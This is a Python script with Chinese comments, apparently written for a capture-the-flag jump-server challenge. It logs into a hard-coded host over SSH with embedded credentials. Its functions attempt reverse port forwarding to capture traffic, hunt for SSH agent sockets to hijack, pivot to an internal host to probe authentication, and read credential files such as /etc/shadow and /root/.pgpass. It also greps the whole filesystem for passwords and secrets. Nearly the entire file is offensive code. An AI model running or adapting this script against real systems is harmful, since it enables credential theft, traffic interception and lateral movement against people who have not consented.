import paramiko
import socket
import time
import sys
import threading
import select

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=10):
    """执行命令并返回输出"""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out + err

def test_reverse_forward_attack():
    """
    反向端口转发攻击：
    1. 我们请求跳板机在某个端口监听
    2. 当有人连接这个端口时，流量被转发给我们
    3. 如果管理员/服务通过这个端口连接，我们可以捕获信息
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 请求远程端口转发
    # 这会让服务器在某个端口监听，并将连接转发给我们
    print("[*] 请求远程端口转发...")
    
    def handle_connection(channel, src_addr, dest_addr):
        print(f"[+] 收到连接! src={src_addr}, dest={dest_addr}")
        
        # 读取数据
        try:
            channel.settimeout(5)
            data = channel.recv(4096)
            print(f"[+] 收到数据: {data}")
        except:
            pass
        
        channel.close()
    
    # 请求转发
    try:
        port = transport.request_port_forward('', 0, handle_connection)
        print(f"[+] 远程端口转发已开启，端口: {port}")
        
        # 等待连接
        print("[*] 等待连接... (按Ctrl+C退出)")
        time.sleep(10)
        
        transport.cancel_port_forward('', port)
    except Exception as e:
        print(f"[-] 错误: {e}")
    
    ssh.close()

def test_forwarded_agent():
    """
    测试SSH Agent转发劫持
    如果有其他用户通过SSH agent转发连接，我们可能可以利用它
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查SSH_AUTH_SOCK
    print("[*] 检查agent socket...")
    
    # 搜索所有socket文件
    result = exec_cmd(ssh, "find /tmp -type s")
    print(f"Socket files: {result}")
    
    # 检查环境变量
    result = exec_cmd(ssh, "printenv")
    print(f"Environment: {result}")
    
    ssh.close()

def test_hostkey_mitm():
    """
    测试host key中间人攻击
    
    当通过ProxyJump连接时，如果跳板机能修改目标的host key，
    就可能进行中间人攻击
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 连接到172.17.0.1并进行SSH握手
    print("[*] 连接到172.17.0.1:22...")
    
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    
    # 创建一个新的transport通过这个通道
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    
    # 获取host key
    key = target_transport.get_remote_server_key()
    print(f"[*] 目标 host key: {key.get_fingerprint().hex()}")
    print(f"[*] Key type: {key.get_name()}")
    
    # 尝试用不同的方式认证
    try:
        # 尝试公钥认证（使用我们的密钥）
        from paramiko import RSAKey
        my_key = RSAKey.generate(2048)
        
        print("[*] 尝试公钥认证...")
        target_transport.auth_publickey(USER, my_key)
        print("[+] 公钥认证成功!")
    except paramiko.AuthenticationException as e:
        print(f"[-] 公钥认证失败: {e}")
    
    target_transport.close()
    ssh.close()

def analyze_connection_pattern():
    """
    分析连接模式
    
    题目提示类似FakeJumpServer，可能涉及到：
    1. SSH客户端在跳转时的行为
    2. 主机密钥验证的绕过
    3. 凭据的泄露
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查容器的网络配置
    print("[*] 检查网络配置...")
    print(exec_cmd(ssh, "ip addr"))
    print(exec_cmd(ssh, "ip route"))
    print(exec_cmd(ssh, "cat /proc/net/route"))
    
    ssh.close()

def check_for_credentials():
    """检查是否有凭据泄露"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 检查可能的凭据位置...")
    
    locations = [
        "/root/.netrc",
        "/root/.pgpass",
        "/root/.my.cnf",
        "/root/.ssh/config",
        "/etc/shadow",
        "/etc/passwd",
        "~/.bashrc",
        "~/.profile",
    ]
    
    for loc in locations:
        result = exec_cmd(ssh, f"cat {loc}")
        if "No such file" not in result and "can't open" not in result and result.strip():
            print(f"\n[+] {loc}:")
            print(result)
    
    # 搜索包含password的文件
    print("\n[*] 搜索包含'password'或'secret'的文件...")
    result = exec_cmd(ssh, "grep -r -i 'password\\|secret' / --include='*.conf' --include='*.cfg' --include='*.txt'")
    if result.strip():
        print(result)
    
    ssh.close()

def test_different_auth_methods():
    """测试172.17.0.1的不同认证方法"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 连接到172.17.0.1并检查支持的认证方法...")
    
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    target_transport = paramiko.Transport(channel)
    target_transport.start_client()
    
    # 获取支持的认证方法
    # 通过发送一个错误的认证来获取
    try:
        target_transport.auth_none(USER)
    except paramiko.BadAuthenticationType as e:
        print(f"[*] 支持的认证方法: {e.allowed_types}")
    except Exception as e:
        print(f"[-] 错误: {e}")
    
    target_transport.close()
    ssh.close()

if __name__ == "__main__":
    print("="*50)
    print("[*] 高级SSH攻击测试")
    print("="*50)
    
    print("\n[1] 分析连接模式")
    analyze_connection_pattern()
    
    print("\n[2] 检查凭据")
    check_for_credentials()
    
    print("\n[3] 测试172.17.0.1的认证方法")
    test_different_auth_methods()
    
    print("\n[4] 测试agent转发")
    test_forwarded_agent()
